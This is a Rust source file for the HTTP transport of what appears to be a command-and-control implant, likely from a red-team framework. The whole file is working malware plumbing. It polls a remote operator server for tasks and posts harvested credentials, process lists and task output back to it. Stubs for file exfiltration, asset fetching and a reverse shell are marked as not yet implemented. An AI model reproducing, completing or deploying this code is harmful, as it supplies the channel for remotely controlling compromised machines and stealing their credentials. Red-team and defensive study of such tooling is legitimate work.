use crate::Transport;
use anyhow::Result;
use pb::c2::*;
use std::sync::mpsc::{Receiver, Sender};

#[derive(Clone, Debug)]
pub struct HTTP {
    client: Option<reqwest::Client>,
    base_url: String,
}

impl Transport for HTTP {
    fn init() -> Self {
        HTTP {
            client: None,
            base_url: String::new(),
        }
    }

    fn scheme(&self) -> &'static str {
        "http"
    }

    fn new(uri: String, proxy_uri: Option<String>) -> Result<Self> {
        let mut builder = reqwest::Client::builder();

        if let Some(proxy_uri_string) = proxy_uri {
            builder = builder.proxy(reqwest::Proxy::all(proxy_uri_string)?);
        }

        let client = builder.build()?;
        Ok(HTTP {
            client: Some(client),
            base_url: uri,
        })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        let client = self
            .client
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("http client not initialized"))?;
        let url = format!("{}/claim_tasks", self.base_url);
        let resp = client.post(&url).json(&request).send().await?;
        let resp_bytes = resp.bytes().await?;
        let response: ClaimTasksResponse = serde_json::from_slice(&resp_bytes)?;
        Ok(response)
    }

    async fn fetch_asset(
        &mut self,
        _request: FetchAssetRequest,
        _sender: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        // Not implemented for HTTP transport yet
        Ok(())
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        let client = self
            .client
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("http client not initialized"))?;
        let url = format!("{}/report_credential", self.base_url);
        let resp = client.post(&url).json(&request).send().await?;
        let resp_bytes = resp.bytes().await?;
        let response: ReportCredentialResponse = serde_json::from_slice(&resp_bytes)?;
        Ok(response)
    }

    async fn report_file(
        &mut self,
        _request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        // Not implemented for HTTP transport yet
        Ok(ReportFileResponse {})
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        let client = self
            .client
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("http client not initialized"))?;
        let url = format!("{}/report_process_list", self.base_url);
        let resp = client.post(&url).json(&request).send().await?;
        let resp_bytes = resp.bytes().await?;
        let response: ReportProcessListResponse = serde_json::from_slice(&resp_bytes)?;
        Ok(response)
    }

    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        let client = self
            .client
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("http client not initialized"))?;
        let url = format!("{}/report_task_output", self.base_url);
        let resp = client.post(&url).json(&request).send().await?;
        let resp_bytes = resp.bytes().await?;
        let response: ReportTaskOutputResponse = serde_json::from_slice(&resp_bytes)?;
        Ok(response)
    }

    async fn reverse_shell(
        &mut self,
        _rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        _tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        // Not implemented for HTTP transport yet
        Ok(())
    }
}
